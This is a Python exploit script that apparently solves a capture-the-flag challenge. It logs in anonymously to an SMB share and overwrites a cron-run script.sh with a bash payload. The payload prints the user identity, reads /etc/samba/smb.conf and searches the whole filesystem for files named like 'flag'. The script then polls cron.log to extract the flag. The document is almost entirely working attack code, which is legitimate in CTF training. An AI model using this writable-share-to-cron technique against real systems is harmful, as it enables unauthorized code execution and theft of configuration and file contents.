#!/usr/bin/env python3
import io
import time
import re
from smb.SMBConnection import SMBConnection

HOST = "xebec.cylabacademy.net"
PORT = 30876

print(f"[*] Connecting to {HOST}:{PORT}...", flush=True)
conn = SMBConnection("", "", "client", "server", use_ntlm_v2=True, is_direct_tcp=True)
if not conn.connect(HOST, PORT, timeout=10):
    print("[-] Connection failed!")
    exit(1)

print("[+] Connected to SMB!", flush=True)

# Payload: inspect system, find all flag files, output them
payload = """#!/bin/bash
echo "=== RUN_START ==="
id
cat /etc/samba/smb.conf
find / -iname "*flag*" 2>/dev/null
for f in $(find / -iname "*flag*" 2>/dev/null); do
    echo "--- FILE: $f ---"
    cat "$f" 2>/dev/null
done
echo "=== RUN_END ==="
"""

bio = io.BytesIO(payload.encode("utf-8"))
conn.storeFile("shares", "/script.sh", bio)
print("[+] Overwrote script.sh with payload!", flush=True)

# Read previous cron.log to know baseline
bio_prev = io.BytesIO()
conn.retrieveFile("shares", "/cron.log", bio_prev)
prev_content = bio_prev.getvalue().decode("utf-8", errors="replace")
print(f"[*] Baseline cron.log:\n{prev_content.strip()}", flush=True)

# Loop and poll cron.log
start_time = time.time()
flag = None
while time.time() - start_time < 90:
    time.sleep(3)
    bio_cur = io.BytesIO()
    try:
        conn.retrieveFile("shares", "/cron.log", bio_cur)
        cur_content = bio_cur.getvalue().decode("utf-8", errors="replace")
        if "=== RUN_START ===" in cur_content:
            print("[+] Found RUN_START in cron.log!", flush=True)
            print(cur_content, flush=True)
            m = re.search(r"(?:academy|picoCTF)\{[^}]+\}", cur_content)
            if m:
                flag = m.group(0)
                print(f"[+] EXTRACTED FLAG: {flag}", flush=True)
                with open("flag.txt", "w", encoding="utf-8") as f:
                    f.write(flag + "\n")
                break
        else:
            print(f"[*] Waiting for cron... ({int(time.time() - start_time)}s elapsed)", flush=True)
    except Exception as e:
        print(f"[-] Poll error: {e}", flush=True)

conn.close()

if flag:
    print(f"\n[SUCCESS] FLAG: {flag}", flush=True)
else:
    print("[-] Flag not acquired in time.", flush=True)
